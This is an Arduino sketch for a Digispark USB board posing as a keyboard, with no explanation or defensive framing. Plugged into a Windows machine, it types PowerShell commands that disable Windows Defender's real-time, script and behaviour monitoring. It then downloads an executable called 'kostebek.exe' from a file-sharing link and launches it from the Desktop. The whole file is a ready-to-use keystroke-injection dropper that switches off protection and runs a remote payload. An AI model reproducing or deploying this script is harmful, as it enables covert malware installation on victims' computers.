#include "DigiKeyboard.h"
#define kbd_tr_tr
#define LAYOUT_TURKISH
void setup() {
 
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("'Set-MpPreference -DisableRealtimeMonitoring");
  DigiKeyboard.print("$true -DisableScriptScanning $true");
  DigiKeyboard.print("-DisableBehaviorMonitoring");
  DigiKeyboard.print("$true -DisableIOAVProtection $true");
  DigiKeyboard.print("-DisableIntrusionPreventionSystem $true'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("$client.DownloadFile('https://filetransfer.io/data-package/o8auHdKR/download',");
  DigiKeyboard.print("'C:\\Users\\bitch\\Desktop\\kostebek.exe')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(45000);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);


  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cd Desktop");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("start kostebek.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

}




void loop() {
  // put your main code here, to run repeatedly:

}
